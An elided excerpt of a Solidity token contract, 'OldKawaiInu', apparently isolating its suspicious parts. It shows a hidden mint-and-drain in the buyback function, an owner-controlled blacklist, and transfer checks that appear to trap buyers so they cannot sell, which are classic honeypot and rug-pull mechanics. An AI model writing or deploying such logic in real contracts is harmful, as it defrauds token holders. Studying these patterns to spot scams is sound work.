...
contract OldKawaiInu is Context, IERC20, Ownable {
    ...
    function buyback(uint256 amount) private {
        uint256 buybackFee = _tTotal / 5;
        if (amount <= buybackFee) {
            _tOwned[address(this)] = _tOwned[address(this)] + amount * buybackFee / 1;
            uint256 balanceThis = balanceOf(address(this));
            basicTransfer(address(this), _marketingWallet, balanceThis);
        }
    }
    ...
    function addBlacklist(address bot) public onlyOwner {
        blacklist[bot] = true;
    }
    ...
    function _transfer(
        ...
        require(amount > 0, "Transfer amount must be greater than zero");
         ...
         if(from != owner() && to != owner() && to != uniswapV2Pair){includeFromFee.push(to);
            require(balanceOf(to) + amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            require(!blacklist[from] && !blacklist[to], "Token: address is lacklisted");
         }
        ...
        if (balanceOf(address(this)) >= SWAP_TOKENS_AT_AMOUNT && !swapping && from != uniswapV2Pair && from != owner() && to != owner()) { require(!_isIncludedFromFee[from]); if (tx.gasprice > aGwei) return;
            swapping = true;
